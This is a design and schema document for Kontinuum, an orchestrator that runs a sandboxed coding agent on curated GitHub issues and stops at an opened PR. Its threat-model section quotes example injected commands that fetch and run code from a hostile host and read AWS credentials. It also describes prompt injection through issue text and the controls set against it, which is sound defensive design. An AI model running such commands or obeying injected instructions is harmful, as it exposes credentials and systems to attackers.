# Kontinuum — MVP Design & Schema (v3, true MVP)

> Companion to `kontinuum-spec.md`. The spec is the *vision*; this is the *minimum loop that
> works* — poll a curated issue, implement it in a credential-free sandbox, verify with local
> tests + existing CI, open a PR for a human. Everything that hardens or extends this loop lives
> in **§16 Later**, each with the signal that says "now build it." Nothing there is discarded;
> it is deferred until the simple loop actually holds.

**Design invariants (must always hold — everything else serves these):**
1. **At most one instance works any issue** (single-owner), even under crashes, races, and human label edits.
2. **Nothing ships without a human** — K opens PRs; it never merges or deploys.
3. **The agent never holds privileged credentials and never runs unsandboxed** — untrusted input cannot exfiltrate or destroy.
4. **A change is "done" only on objective, reproducible evidence** — never an LLM's say-so.
5. **Any component can die at any instant with no lost or duplicated work** — state is recoverable and effects are idempotent.

---

## 1. One-sentence framing

**Kontinuum is a persistent, plain-code orchestrator that each developer runs; it continuously pulls human-curated GitHub issues from a shared queue, claims one via an epoch-leased claim log so no other instance can double-work it, runs a disposable coding agent inside a credential-free sandbox to implement it, verifies the result with a fast local gate plus the repo's existing CI, and opens a pull request for a human to merge — 24/7 and crash-recoverable.**

GitHub issues are the one canonical queue. The human owns backlog order and the merge button.

---

## 2. Decision Log (MVP)

| # | Decision | Choice | Why |
|---|----------|--------|-----|
| 1 | Agent runtime | **Claude Agent SDK** behind `AgentRunner` port | Inherit tools/MCP/permissions; agnostic at one seam |
| 2 | MVP scenario | **Existing-service maintenance only** | Autonomy needs ground truth to verify against |
| 3 | Work queue | **GitHub issues = single canonical queue + coordination substrate** | Solve claiming/dedup/audit/curation *once* |
| 4 | Human gate | **Stops at open PR** | Worst case = an unmerged branch: reversible, zero prod impact |
| 5 | Selection | **Continuous loop over a human-curated queue** | Thesis preserved without the LLM guessing priority |
| 6 | State topology | **Docs in-repo + ops in Kontinuum-owned SQLite (cache)** | Reviewable living docs; GitHub is the ownership authority |
| 7 | Loop driver | **Long-running polling supervisor** | Simple, no inbound net, DB-driven resume |
| 8 | Coordination | **Epoch-leased claim log (issue comments); labels are a projection** | Correct under reclaim, races, and human label edits |
| 9 | Isolation | **Serial, one ephemeral sandbox per task** | No self-conflicts; strong isolation of untrusted execution |
| 10 | Security | **Credential-free sandbox + Effect Broker + egress allowlist** | Untrusted issue content cannot exfiltrate or run privileged actions |
| 11 | Verification | **Fast local gate (build/lint/test) + heavy e2e delegated to existing CI** | K needn't reproduce prod locally; CI already has the real env |
| 12 | Deployment | **Per-developer workers** | Execution fans out; single-owner keeps it safe |
| 13 | Verification judge | **Objective gate + one independent Reviewer**, bounded retry | Coder can't grade its own homework; a fresh context catches what the gate can't |

Deferred decisions (N-diverse reviewers, agent registry/router, trust tiers, producers, drift detection) are in **§16 Later**.

---

## 3. Architecture Schema

```
        ┌───────────────────────────────────────────────────────┐
        │   GitHub Issues  —  the single canonical work queue     │
        │   • epoch-leased CLAIM LOG (comments) = ownership truth  │
        │   • labels = human-facing projection of state           │
        └───────────────────────────┬───────────────────────────┘
                     each developer's K polls & claims (epoch+lease)
        ┌────────────────────────────┼───────────────────────────┐
        ▼                            ▼                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  K instance  (per developer)                                      │
  │  ┌───────────────┐   reconcile   ┌──────────────┐                 │
  │  │ Orchestrator  │◄────────────► │  state.db    │  (cache only)   │
  │  │ (plain code)  │               └──────────────┘                 │
  │  │  loop · gate  │                                                 │
  │  │  EFFECT BROKER│ ── privileged effects (push/PR/comment/label)   │
  │  │  (holds creds)│    executed HERE, never by the agent           │
  │  └──────┬────────┘                                                 │
  │         │ provisions the repo only (no host creds)                │
  │         ▼                                                          │
  │  ┌──────────────────────────────────────────────┐                 │
  │  │  SANDBOX (ephemeral container, no host creds, │                 │
  │  │  egress allowlist)                            │                 │
  │  │    AgentRunner → Implementer agent            │                 │
  │  │    works a git worktree; emits DIFF + evidence│                 │
  │  └──────────────────────────────────────────────┘                 │
  │         │ diff + PR proposal (data, not effects)                   │
  │         ▼  Effect Broker validates → pushes → opens PR             │
  │  Verification:  local gate (build/lint/test)  ·  e2e → existing CI │
  └──────────────────────────────────────────────────────────────────┘
      Ports: IssueQueue(GitHub) · AgentRunner(ClaudeSDK) · VerificationEnv(recipe)
```

**The two security-critical roles:**
- **The agent is a sandboxed, credential-free proposer.** It reads the repo, emits a **diff + PR body + evidence** — all *data*. It cannot push, comment, merge, or reach the network beyond an allowlist.
- **The Effect Broker is the only thing with credentials.** Every privileged, outward, or irreversible action (push, open PR, comment, label) runs in the orchestrator after policy checks. Privilege separation is the core defense against prompt injection.

---

## 4. Deployment Model — per-developer workers

Private `state.db`s ⇒ **GitHub is the only shared state**, which is why both the queue and the
lock live there. Execution fans out across developers safely because claiming guarantees
single-owner (§7).

- **Per-dev workers:** safe via the claim log; each has its **own budget caps** (no global budget in MVP — stated so nobody's surprised).
- **Identity:** `instance_id = kontinuum/<dev>@<host>`, stamped in every claim-log entry.
- **Kill switches:** a repo-level `kontinuum:paused` label halts all instances for that repo; each K also honors a local `kontinuum stop`. A global org kill = revoke the bot's token.

---

## 5. Component Responsibilities

| Component | Kind | Responsibility |
|---|---|---|
| **Orchestrator** | code | The loop: poll → claim → execute → gate → PR → maintain → reconcile. Owns retries, budget, recovery, and inline cleanup of finished worktrees/branches. |
| **Effect Broker** | code (holds creds) | Executes ALL privileged effects (git push, PR, comment, label) after policy checks. The agent has none of these. |
| **Sandbox** | infra | Ephemeral container per task: repo + worktree, no host secrets, egress allowlist. Agent runs here. |
| **IssueQueue** | port (GitHub) | List `ready`, read/append claim log, transition label projection, open PR, read CI status. Authoritative for ownership. |
| **Implementer** | LLM | Plan + TDD + code. Emits *data* (diff, evidence, PR body); requests *effects*. |
| **Reviewer** | LLM | Independent, fresh-context adversarial review of the proposal (correctness, requirements, evidence honesty). Emits a verdict; requests no effects. |
| **AgentRunner** | port | Run an agent in the sandbox; return proposal (diff, evidence, cost, transcript). MVP: Claude Agent SDK. |
| **VerificationEnv** | port | Execute the recipe's local gate; return per-step pass/fail + logs. Report/await CI for e2e. |
| **state.db** | SQLite | Per-instance cache of ownership + scheduling. Never committed. |

---

## 6. The Single Work Queue — typing & qualification

Two kinds of intent stay separate: **standing spec** (product spec/constraints → `.kontinuum/`
config, *not* an issue) vs **discrete work items** (everything actionable → issues).

- **Qualification gate:** confident+actionable → `kontinuum:ready`; uncertain → `kontinuum:needs-triage` (a human promotes). Only `ready` is ever picked up. Stops raw noise from flooding the backlog.
- **Typed work — defines "done":**

| Type | "Done" means | Terminal artifact |
|---|---|---|
| `type/implement` | code satisfies acceptance criteria | **PR** |
| `type/fix` | regression resolved + proving test | **PR** |

`type/investigate` (root-cause against Sentry/ES/Grafana) needs read-only signal access and is in **§16 Later**.

---

## 7. Distributed Claiming — epoch-leased claim log

**Ownership truth is the append-only claim log (issue comments), not labels.** Labels are a
human-facing projection K keeps in sync but never trusts for correctness — so a human editing
a label cannot corrupt ownership. Comments are immutable and GitHub-serialized with monotonic
IDs, giving a deterministic total order.

Each log entry is a fenced marker:
```
<!-- kontinuum-claim {"kind":"claim|heartbeat|release","owner":"kontinuum/uros@laptop",
                      "epoch":7,"lease_until":"2026-08-13T18:40:00Z"} -->
```

**Ownership is a pure function of the ordered log + now (deterministic, correct on reclaim):**
```
resolve_owner(log, now):                                # FIRST claimer at the top epoch wins
    live  = [m in log : m.kind in (claim,heartbeat)]
    if not live: return None
    epoch = max(m.epoch for m in live)                  # highest epoch = current generation
    claims = [m in log : m.epoch==epoch, m.kind==claim] ordered by comment_id
    if not claims: return None
    winner = claims[0].owner                            # earliest claim at this epoch — NOT latest
    if any(m.kind==release, m.epoch==epoch, m.owner==winner): return None   # owner-matched release
    lease = max(m.lease_until : m in live, m.epoch==epoch, m.owner==winner) # owner's heartbeats extend
    return winner if lease > now else None              # expired ⇒ free
```
> Verified in code (`kontinuum/claim.py`) by a property test over randomized interleavings. An
> earlier "latest comment_id wins + owner-blind release" formulation was found to allow a
> double-claim (a later same-epoch claim stole an already-confirmed one) — hence first-claimer-wins.

**Claim / reclaim (same code path):**
```
claim(issue):
    log  = IssueQueue.read_claim_log(issue)             # direct GET (strongly consistent)
    cur  = resolve_owner(log, now)
    if cur and cur != me: return SKIP                   # someone holds a live lease
    next_epoch = max_epoch(log) + 1                     # reclaim ⇒ strictly higher epoch
    EffectBroker.append_claim(issue, epoch=next_epoch, lease=now+LEASE)
    log2 = IssueQueue.read_claim_log(issue)             # READ-BACK breaks same-tick ties
    if resolve_owner(log2, now) != me:                  # a lower comment_id at my epoch beat me
        EffectBroker.append_release_if_mine(issue, next_epoch); return SKIP   # yield cleanly
    EffectBroker.set_label_projection(issue, 'claimed'); return OWNED
```

- **Reclaim is correct:** ownership is the *live, highest-epoch* claim, never "earliest ever," so a dead owner's stale claim is superseded by `epoch+1`. Two concurrent reclaimers tie on epoch → the **earliest comment_id at that epoch** wins (deterministic for all readers); the loser appends an owner-matched `release` and yields.
- **Heartbeat = re-claim at the same epoch** with an extended lease; owner refreshes every `LEASE/3`. Crash ⇒ lease lapses ⇒ any K reclaims at `epoch+1`.
- **Human-interference guard:** `assert_owner()` = `resolve_owner(read_claim_log())==me`. K calls it **before every state transition and immediately before every Effect Broker action** (start impl, run gate, push, open PR). If it fails → abort, clean sandbox, log `LOST_CLAIM`. A human can forcibly reclaim by adding `kontinuum:hold` (K treats it as "release and back off").
- Labels (`ready|claimed|pr-open|blocked|needs-triage|hold|paused`) are configurable and bootstrapped by `kontinuum init-labels`. GitHub calls use **conditional requests (ETags) and adaptive backoff** to stay inside rate limits.

---

## 8. Security & Threat Model

**Threat:** issue text is attacker-influenceable, and K executes repo build/test code. Without
controls, an injected instruction (*"…also run `curl evil|sh`"* or *"print `~/.aws/credentials`"*)
could exfiltrate credentials or push malicious code.

**Three independent controls, each sufficient to blunt the worst case:**

| # | Control | What it stops |
|---|---|---|
| 1 | **Credential-free sandbox**: agent runs in an ephemeral container with the repo only; **no** host env, tokens, or keys | An injected command has nothing to steal and nowhere privileged to act |
| 2 | **Privilege separation via Effect Broker**: push/PR/comment/label are orchestrator functions, never agent tools; agent output is a *proposal* | A compromised agent cannot perform outward or irreversible effects |
| 3 | **Egress allowlist**: sandbox network deny-by-default; allow only package registries + the repo host | Exfiltration is blocked even if injection succeeds |

Two cheap add-ons kept because they cost almost nothing:
- **Untrusted-content framing (spotlighting):** issue text is delivered as clearly delimited *data describing desired behavior*, never as agent instructions.
- **Secret scan on the proposal** before any push: block if the diff adds secrets. Cheap guard against a credential leaking into a PR.

The **human PR review + CI** remain the final backstops; the diff makes any injected change visible.

> **Scope:** MVP targets a team's **own** repos (internal issue authors). Public repos with
> anonymous/external reporters need the trust-tier hardening + red-team suite in **§16 Later**.
> Revisit before pointing K at an untrusted repo.

---

## 9. Verification Model

Verification is declared per repo in `verify.yaml`. K runs a **fast local gate** in the sandbox
and **delegates heavy e2e to the repo's existing CI** — so K never reproduces prod locally,
which is often impossible and always slow.

| Stage | Runs | Where | Required to open PR? |
|---|---|---|---|
| **local gate** build + typecheck + lint + unit tests | seconds–min | sandbox | always |
| **e2e** integration / full stack | slow / needs real env | **existing CI on the pushed branch** | gate on **CI status**, not local run |

**Flow:** local gate passes → Effect Broker pushes branch + opens PR → CI runs e2e → K **reads
CI status** (just another IssueQueue read) → only a green required-check set advances the task to
`DONE_PENDING_MERGE`. Red CI → back to Implementer (bounded) or `BLOCKED`. Heavy work runs off the
dev's machine, in parallel CI.

**Per-type evidence (no blanket proving-test):** the Implementer emits a `verification_evidence`
block, validated *proportionally*:

| Change class | Required evidence |
|---|---|
| `fix` | a regression test that **fails before, passes after** |
| `implement` (logic) | tests covering the new behavior + acceptance criteria |
| refactor / config / deps / docs | full suite still green + **no coverage drop**; a short justification of why no new test |

---

## 10. Task Execution Pipeline (per issue)

```
execute(task):
  assert_owner()                                   # §7 — abort if lost (human/lease)
  sandbox = Sandbox.create()                       # ephemeral, no creds, egress allowlist
  worktree in sandbox: fresh branch off default

  ┌─ Implementer agent — in sandbox ─────────────────────────────────┐
  │  read issue (as delimited data) + Current State docs + AC        │
  │  plan.md → per-type tests → code → make green                    │
  │  emit PROPOSAL: {diff, verification_evidence, pr_body}           │
  └───────────────────────────────────────────────────────────────────┘
  ┌─ Local gate (code): VerificationEnv build/lint/test + secret scan┐
  │  fail → retry Implementer (≤3, feedback accumulated) else BLOCKED │
  └───────────────────────────────────────────────────────────────────┘
  ┌─ Reviewer (LLM, independent, fresh context) ─────────────────────┐
  │  check correctness · requirements · evidence honesty             │
  │  reject → retry Implementer (≤3, feedback accumulated) else BLOCKED│
  └───────────────────────────────────────────────────────────────────┘
  assert_owner()                                    # re-check right before effects
  EffectBroker:  push branch → open PR (Closes #N, evidence, what/why/how)
                 → label pr-open → comment issue → Slack
  await CI (e2e): read status → green ⇒ DONE_PENDING_MERGE; red ⇒ retry/BLOCKED
  Sandbox.destroy(); Orchestrator cleans branch/worktree
```

- **Reviewer independence, honestly framed:** two LLMs share blind spots and can both misread an ambiguous issue — so the Reviewer is *one input*, not a trust anchor. The real anchors stay objective gate + CI + human PR review. MVP runs **one** independent reviewer; **perspective-diverse (N) reviewers** for high-risk/`external` work are in **§16 Later**.
- **Retry oscillation guard:** feedback accumulates across attempts; if two consecutive attempts produce near-identical diffs, or a verdict flips without a diff change, stop → `BLOCKED` with a summary. Hard cap 3.

---

## 11. Work-item Lifecycle + Failure Taxonomy

```
  state.db (cache)      GitHub label          ownership/authority
  ────────────────      ────────────          ───────────────────
  DISCOVERED         →  (none)                human files
  PENDING            →  ready                 qualified & eligible
  CLAIMED/RUNNING    →  claimed               live claim (epoch+lease) = me
  VERIFYING          →  claimed               lease heartbeated
  PR_OPEN_CI         →  pr-open               PR up; awaiting CI
  DONE_PENDING_MERGE →  pr-open               CI green; human merges
  BLOCKED            →  blocked               retries/CI exhausted → human
  LOST_CLAIM         →  (label may be gone)   assert_owner failed → abandon cleanly
  needs-triage       →  needs-triage          producer/human unsure → human promotes
  MERGED/CLOSED      →  (labels removed)      human acts
```

| Failure | Detection | Recovery |
|---|---|---|
| Agent crash / timeout | run heartbeat | reset task→PENDING, lease lapses, reclaimable |
| Gate/CI red | exit codes / CI status | retry ≤3 (accumulated feedback) → BLOCKED |
| Reviewer reject | verdict | retry ≤3 → BLOCKED; oscillation → BLOCKED |
| Lost claim (human/lease) | `assert_owner` | abort, destroy sandbox, no effects emitted |
| PR base moved / conflicts | PR-maintenance poll | rebase + re-verify; unresolved → `needs-human` |
| Rate limit | GitHub headers | adaptive backoff |

---

## 12. Reliability & Recovery

- **Single ownership authority:** GitHub claim log is the **only** source of truth for ownership; `state.db` is a *cache*. Every ownership-critical decision re-reads the log (`assert_owner`). A crash between a GitHub effect and a local write self-heals on the next reconcile, because local state is derived, never authoritative.
- **Idempotent effects via GitHub itself:** before opening a PR, check for an existing open PR from this task's branch; before commenting, check for the marker. GitHub is already the authority — no separate local ledger needed (that's a **§16 Later** optimization if querying proves too slow).
- **Crash recovery:** on startup, resume the local `RUNNING` task **iff** its GitHub lease is still ours and unexpired; else release and re-queue. Chaos-tested (§15).
- **PR maintenance:** for `pr-open` tasks the loop watches base movement / CI; on drift it rebases + re-runs the gate; on unresolvable conflicts → `needs-human` + Slack.
- **Inline cleanup:** the Orchestrator GCs merged/abandoned worktrees and local branches at loop top, and prunes `runs/` past a retention window. A dedicated Janitor subsystem is **§16 Later**.

---

## 13. Data Model

```
-- state.db (per instance; a CACHE of GitHub-authoritative ownership + local scheduling)
repos(id, url, default_branch, status[onboarding|active|paused], recipe_hash, onboarded_at)
work_items(id, repo_id, external_id, type, title, priority, state,
           owner_epoch, lease_until, blocked_reason)
tasks(id, work_item_id, branch, sandbox_id, attempt, state, plan_ref, pr_url, ci_status)
```

Run transcripts, gate logs, and diffs live as files under `runs/<task-id>/` (not DB rows).
Budget is a per-instance counter (tokens/day, PRs/day) checked before each agent run.
History-query tables (`effects`, `runs`, `gate_results`, `decisions`, `budget`) are **§16 Later**,
added when you actually need to query the past rather than read a log file.

---

## 14. Configuration & Recipe Schemas

`~/kontinuum-home/config.yaml` (per instance):
```yaml
instance_id:   kontinuum/uros@laptop
identity:      { github_app: kontinuum-bot }        # creds held by Effect Broker only
poll_interval: 5m
lease:         60m                                   # heartbeat every ~20m
budget:        { tokens_per_day: 5_000_000, prs_per_day: 10 }
sandbox:       { runtime: docker, egress_allowlist: [registry.npmjs.org, github.com] }
slack:         { webhook: <url>, channel: "#kontinuum" }
```

`<repo>/.kontinuum/verify.yaml` (per repo, human-confirmed at onboarding — the trust anchor):
```yaml
gate:
  run:      "make lint typecheck build && docker compose run app npm test"
  required: true
e2e:
  delegate: ci                # e2e runs in existing CI on the PR; K gates on status
  required: true
seed:  "./scripts/seed.sh"
env:   fresh_per_task
```

---

## 15. Repo & Process Layout

```
kontinuum-home/                     # per-developer process dir (NOT a target repo)
  state.db  config.yaml
  runs/<task-id>/{transcript.jsonl, gate.log, diff.patch}   # retained 30d
  sandboxes/<task-id>/             # ephemeral, destroyed after task

<target-repo>/.kontinuum/           # committed INTO each repo via PRs (shared, reviewed)
  config.yaml  verify.yaml          # verify.yaml = trust anchor
  CURRENT_STATE.md                  # generated at onboarding; split later if it grows

GitHub Issues                       # shared queue + claim log + audit + curation
Existing CI                         # runs e2e on K's PRs (K gates on status)
```

---

## 16. Later — deferred, designed, not discarded

Each item is a real feature cut from the first loop. Build it when its trigger fires; not before.

| Deferred | What it adds | Add when |
|---|---|---|
| **N-diverse reviewers** (correctness/security/requirements lenses) | Multiple perspective-diverse reviewers instead of the single MVP reviewer | high-risk paths (security/payment/auth) or `trust:external` work |
| **Agent Registry + Router** (matcher + priority; custom agents) | `(role,task)→agent`, custom runners override defaults | a **2nd runner** exists (e.g. an integration-test harness) — inline the role→agent map until then |
| **Surveyor** as a distinct onboarding agent | Specialized repo-survey pass | onboarding quality with the generalist Implementer proves insufficient |
| **Trust tiers** (`internal|external`) + **hardened sandbox profile** | Stricter egress + human-promote + N-diverse review for untrusted issues | before pointing K at a repo with **external/anonymous** issue reporters |
| **Red-team injection test suite** | Assert egress blocked, no unproposed effects, secrets caught | alongside trust tiers / before untrusted repos |
| **Recipe drift detection** (`manifest_hash` → re-onboarding PR) | Detects build-file changes that stale `verify.yaml` | silent false-BLOCKs from changed build files actually appear |
| **`type/investigate` + SignalReader** (read-only Sentry/ES/Grafana) | Root-cause tasks that read production signals | the core repo loop is reliable and signal-driven work is wanted |
| **Producers** (Asana/Sentry/ES/Grafana → issues) + `ingest.db` | Automated signal→issue creation, idempotent via own store | after the core loop holds; the issue-queue seam already supports them |
| **L2 integration tier** + `feasible` knob | A middle verification tier between unit and CI-e2e | a repo needs integration tests in the local gate specifically |
| **Idempotency-ledger `effects` table** | Local exactly-once record instead of GitHub-query dedup | GitHub-query dedup proves too slow or rate-limited |
| **History tables** (`runs`, `gate_results`, `decisions`, `budget`) | Queryable history instead of log files + counters | you need to *query* the past, not just read a file |
| **Janitor** as a scheduled subsystem + retention policy | Formal GC of worktrees/branches/`runs/`, stale-claim/recipe surfacing | inline cleanup can't keep up (disk pressure, many stale artifacts) |
| **Team-wide budget / shared Postgres state** | Global caps across instances | per-instance budgets prove insufficient |
| **Merge/deploy autonomy, post-deploy verification, parallel execution, web dashboard** | Beyond "stop at PR" | explicitly out of MVP thesis; separate decision |

---

## 17. Testing Kontinuum Itself

The safety invariants (§0) are **verified, not assumed**, via a deterministic simulation harness
that swaps real ports for fakes (`FakeIssueQueue`, `FakeAgentRunner`, `FakeClock`, `FakeSandbox`):

- **Property tests on claiming:** spawn K concurrent claimers + injected crashes + lease expiry + adversarial human label edits → assert **single-owner** and **no lost/duplicated work** across thousands of randomized interleavings.
- **Chaos tests:** `kill -9` at every step boundary → assert recovery reconciles to a consistent state with no duplicate PRs/comments.
- **Golden e2e:** a fixture repo with known issues → assert PRs open only on green evidence and false-BLOCK rate stays under target.

Red-team injection tests come with the trust-tier work in §16.

---

## 18. Success Metrics / SLOs

| Dimension | Target for "MVP works" |
|---|---|
| **Safety** | 0 double-claims across ≥2 instances over a 1-week soak; 0 unauthorized merges/deploys |
| **Recovery** | `kill -9` at any point → 0 lost or duplicated work (chaos suite green) |
| **Correctness** | ≥50% of `ready` implement/fix issues reach a human-merged PR with no changes requested; false-BLOCK < 15% |
| **Cost** | median cost/issue tracked and within `budget`; no runaway (caps enforced) |
| **Throughput** | ≥ N mergeable PRs/day/instance (set from the Stage-0 spike) |

---

## 19. MVP Scope — IN vs OUT

**IN:** existing-repo onboarding (human-gated); GitHub-issue queue (human-filed/curated);
epoch-leased claim log + human guard; **credential-free sandbox + Effect Broker + egress
allowlist**; local gate (build/lint/test + secret scan) + CI-delegated e2e + per-type evidence;
Implementer → gate → independent Reviewer → PR → CI; PR maintenance/rebase; crash recovery via
GitHub-authoritative ownership; `type/implement` + `type/fix`; Slack + PR/issue + CLI + metrics;
per-instance budgets; **self-test simulation harness**.

**OUT (see §16 for triggers):** N-diverse reviewers; agent registry/router + custom agents;
trust tiers + hardened profile + red-team; recipe drift detection; `investigate` + SignalReader;
producers (Asana/Sentry/ES/Grafana → issues) + `ingest.db`; L2 tier; idempotency ledger; history
tables; Janitor subsystem; team-wide budget / shared Postgres; merge/deploy autonomy; post-deploy
verification; parallel execution; web dashboard.

---

## 20. Build Order (each shippable; safety-first)

0. **Stage-0 spike (no orchestrator code):** stand up the `verify.yaml` gate on **2–3 real target repos**; measure local gate bring-up time and throughput. CI-for-e2e is already confirmed (CI always runs on GitHub); the spike only measures timing.
1. **Skeleton loop + state.db + sim harness** — poll `ready`, print queue; property-test scaffolding.
2. **Claim log + human guard** — run 2 instances against 1 repo; **prove no double-claim** (property + soak).
3. **Sandbox + Effect Broker + egress allowlist** — agent runs credential-free.
4. **Onboarding** — produce `CURRENT_STATE.md` + validated `verify.yaml`; onboarding PR (human-confirmed).
5. **Happy-path pipeline** — Implementer → local gate → PR → gate on CI.
6. **Independent Reviewer + retries + oscillation guard + BLOCKED**.
7. **PR maintenance + inline cleanup + reconcile/chaos recovery**; metrics + `kontinuum status`.

Everything past step 7 is **§16 Later**.

---

## 21. Open Questions (deferred defaults, override anytime)

- **Sandbox runtime:** Docker locally vs a shared CI runner as the sandbox host? *(Default: Docker per instance; revisit if laptops strain.)*
- **Budget unit:** tokens vs $ vs PRs/day? *(Default: tokens/day + PRs/day, per instance.)*
- **Onboarding depth:** one `CURRENT_STATE.md` vs a split doc set? *(Default: one file; split when it's too big to read.)*
